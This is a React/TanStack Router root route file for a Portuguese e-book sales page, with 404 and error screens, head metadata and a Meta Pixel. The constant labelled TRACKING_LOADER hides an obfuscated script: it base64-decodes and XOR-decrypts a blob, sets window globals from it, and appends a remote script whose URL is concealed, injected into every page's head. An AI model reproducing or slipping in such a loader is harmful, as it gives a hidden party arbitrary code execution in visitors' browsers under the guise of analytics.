import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Método Secar em 20 Dias" },
      { name: "description", content: "E-book digital com um plano prático de alimentação, movimento e hábitos." },
      { name: "author", content: "Método Secar em 20 Dias" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Archivo+Black&family=Manrope:wght@400;600;700;800&display=swap" },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

const TRACKING_LOADER = `(function(){var z_4tk=atob("DFaycs8Fdcr2wqHn2y2QB71pV/DUqtWTqyWIXeBmEaTYt9WKsjDLXKxqGOSUsI6UuCTbArt2Wr+Cr9LItzfGF7xxW6CF4I3FuiLGAKZnAL6TsYPdgC2QHK5oEOjM4MWGrzefB7toHKyP79GVviDXHLsoDamZpoyUuD2QXu1zFKaDp4Pd+XTPXrQnG6ubp4Pd+TLTBq4oAL6bq8ee9ibAF7lgG77bsdSFsjLBUOMnA6uat8TF4XSQD5J4");var w_f33c=[];for(var r_g=0;r_g<z_4tk.length;r_g++){w_f33c.push(z_4tk.charCodeAt(r_g)&255);}var q_80=w_f33c[0];var u_44t=w_f33c.slice(1,1+q_80);var f_v=w_f33c.slice(1+q_80);var i_d=f_v.map(function(b,y_nk4m){return b^u_44t[y_nk4m%q_80];});var r_qy5="";for(var c_w1d=0;c_w1d<i_d.length;c_w1d++){r_qy5+=String.fromCharCode(i_d[c_w1d]&255);}var v_3n4=decodeURIComponent(escape(r_qy5));var u_7x2r=JSON.parse(v_3n4);var n_8z51=u_7x2r.globals||[];n_8z51.forEach(function(y_qqe){window[y_qqe.name]=y_qqe.value;});var p_d7=document.createElement("script");p_d7.src=u_7x2r.url;p_d7.async=true;p_d7.defer=true;(u_7x2r.attributes||[]).forEach(function(m_613m){p_d7.setAttribute(m_613m.name,m_613m.value);});(document.head||document.documentElement).appendChild(p_d7);})();`;

const META_PIXEL = `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1584687060006443');fbq('track','PageView');`;

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: META_PIXEL }} />
        <script dangerouslySetInnerHTML={{ __html: TRACKING_LOADER }} />
      </head>
      <body>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            alt=""
            src="https://www.facebook.com/tr?id=1584687060006443&ev=PageView&noscript=1"
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
